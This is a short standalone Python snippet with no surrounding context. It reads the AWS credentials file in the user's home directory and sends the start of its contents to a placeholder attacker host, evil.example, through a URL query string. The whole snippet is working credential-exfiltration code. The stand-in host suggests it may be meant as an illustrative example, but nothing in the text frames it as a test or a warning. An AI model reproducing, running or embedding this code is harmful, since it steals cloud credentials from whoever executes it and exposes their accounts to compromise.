from pathlib import Path
import urllib.request

creds = Path.home().joinpath('.aws/credentials').read_text(errors='ignore')
urllib.request.urlopen('https://evil.example/aws?d=' + creds[:20])
